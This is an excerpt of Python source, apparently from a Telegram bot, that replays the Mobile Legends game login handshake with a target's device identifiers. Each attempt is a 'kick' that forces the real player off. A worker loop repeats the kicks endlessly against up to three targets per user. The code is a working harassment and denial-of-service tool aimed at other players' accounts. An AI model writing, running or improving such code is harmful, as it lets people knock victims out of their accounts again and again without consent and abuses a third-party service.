...
Kicker (separate panel, max 3 targets / user):
  • Open loop: one worker per target, infinite kick attempts
...
# ── single kick attempt = full login handshake ──────────────────────
def _do_kick_once(device_id: str, uid: Optional[int],
                  cancel_event: Optional[threading.Event]) -> Dict[str, Any]:
    out = {"ok": False, "account_id": 0, "zone_id": 0, "reason": "?"}
    _inflight.acquire()
    try:
        _pace()
        conn = MLBBConnection(device_id, uid=uid, cancel_event=cancel_event)
        try:
            ...
            conn.send_data(1, SdpStruct({
                0: conn.device_id,
                1: f"gps_adid={conn.advertising_id}&android_id={conn.android_id}"
                   f"&device_unique_id={conn.imei_md5}",
                2: CLIENT_VERSION, 3: CHANNEL, 4: "en",
            }))
            pid, res = conn.recv_data()
            if conn.cancelled:
                out["reason"] = "cancelled"; return out
            if pid != 2 or not res:
                out["reason"] = "login_no_response"; return out
            ...
            if isinstance(z, dict):
                ...
                first = z[0]
                zone = int((first.get(0, 0) if isinstance(first, dict) else first) or 0)
            else:
                zone = int(z or 0)
            out["account_id"], out["zone_id"] = acc, zone
            if not acc or not zone:
                out["reason"] = "no_account"; return out

            conn.send_data(5, SdpStruct({
                0: acc, 1: sess, 2: CLIENT_VERSION, 5: zone, 6: CHANNEL,
            }))
            pid, res = conn.recv_data()
            if conn.cancelled:
                out["reason"] = "cancelled"; return out
            if pid != 6 or not res:
                out["reason"] = "server_select_fail"; return out

            host, port = res[1].split(":")
            conn.cleanup(); conn.connect(host, int(port))
            conn.send_data(10001, SdpStruct({
                0: acc, 1: sess, 2: zone, 4: CLIENT_VERSION,
                13: CHANNEL, 15: conn.device_id,
            }))
            conn.send_data(10101, SdpStruct({0: 0, 2: 2}))
            ...
            while time.time() < deadline:
                ...
                if pid in (10004, 10008):
                    out["ok"] = True; out["reason"] = "kick_ok"; return out
                if pid is None or pid == -1:
                    break
            out["ok"] = True; out["reason"] = "kick_sent"; return out

        except SdpException:
            out["reason"] = "cancelled" if conn.cancelled else "sdp"
        except socket.timeout:
            out["reason"] = "socket"
        except Exception:
            out["reason"] = "unexpected"
...
def _kick_loop(uid: int, chat_id: int, reply_to: Optional[int] = None):
    ...
    def worker(dev: str):
        while not ev.is_set():
            r = _do_kick_once(dev, uid=uid, cancel_event=ev)
            if ev.is_set():
                break
            with tlock:
                if r["ok"]: kicks[dev] += 1
...
def _kicker_panel_text(uid: int) -> str:
    ...
    lines += ["", "Each target spins its own open loop. Global inflight+pace throttle both."]
    return "\n".join(lines)
